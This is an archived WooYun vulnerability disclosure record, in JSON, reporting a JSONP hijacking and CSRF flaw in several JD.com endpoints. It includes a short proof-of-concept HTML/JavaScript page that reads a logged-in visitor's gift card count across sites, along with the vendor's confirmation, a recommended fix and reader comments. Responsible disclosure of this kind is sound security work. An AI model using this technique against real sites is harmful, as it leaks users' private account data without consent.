{"id": 9833, "wybug_id": "wooyun-2015-0121266", "wybug_title": "京东商城JSONP+CSRF导致某处信息泄露", "wybug_corp": "京东商城", "wybug_author": "Friday", "wybug_date": "2015-06-17 22:00", "wybug_open_date": "2015-08-03 13:02", "wybug_type": "CSRF", "wybug_level": "低", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-03：\t细节向公众公开  简要描述： 最近很火的JSONP+CSRF漏洞的利用 详细说明：  0.0今天小伙伴提到了JSONP漏洞，闲的无聊研究了一下。查资料的时候，看到了JD的广告，衣服的确挺合口味的，点进去，发现一枚漏洞，影响不算大，仅供娱乐~这是我的订单页面存在漏洞的URL：http://joycenter.jd.com/msgCenter/getUnreadNum.action?callback=jsonp1434548327779http://baitiao.jd.com/ious/queryBT?callback=jsonp1434548327780http://giftcard.jd.com/service/getGiftCardCount.action?callback=jsonp1434548327781http://quan.jd.com/getcouponcount.action?callback=jsonp1434548327782没有校验Token，也没有判断referer写了个页面来利用其中的一个URL：\n<meta charset=\"utf-8\">正在请求，请耐心等待... ...<script type=\"text/javascript\">\tstatu=0;\twindow.callback=function(e){\t\tif(parseInt(e['GiftCardCount'])> 0){\t\t\talert('土豪哥哥，你有'+e['GiftCardCount']+'张优惠券~')\t\t}\t\telse{\t\t\talert('臭屌丝，一张优惠券都木有！')\t\t}\t\tstatu=1;\t}\tsetTimeout(function(){ if(statu==0){\t\talert('屌丝，你还木有登陆京东')\t}},10000);</script><script src=\"http://giftcard.jd.com/service/getGiftCardCount.action?callback=callback\"></script>\n   漏洞证明：  参考样例： http://friday.sinaapp.com/jsonp.html如果登录了京东商城，会返回优惠券的张数：\n\n否则十秒后，会返回错误：\n\n肯定还会有其他的漏洞，建议全线检查   修复方案：  验证referer、添加token建议检查全线JSONP，对涉及到用户隐私的请求，一定添加用户验证   版权声明：转载请注明来源 Friday@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-06-19 13:00 厂商回复： 感谢您对京东的关注！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-06-18 00:58 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:54        | 潜心代码审计。)\t\t \n  15个关注也不留个评论，破0    \n     2015-06-18 08:57 |    \t\t屎蛋 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | boom)\t\t \n  马克    \n     2015-07-09 14:01 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:54        | 潜心代码审计。)\t\t \n  提乌云你亏了，提应急响应中心应该有100块钱    \n     2015-08-03 13:10 |    \t\tsOnsec \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:24        | 安全是什么...)\t\t \n  亏了    \n     2015-08-03 13:15 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:26        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  jsonp在《前端xss》那本书就有了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}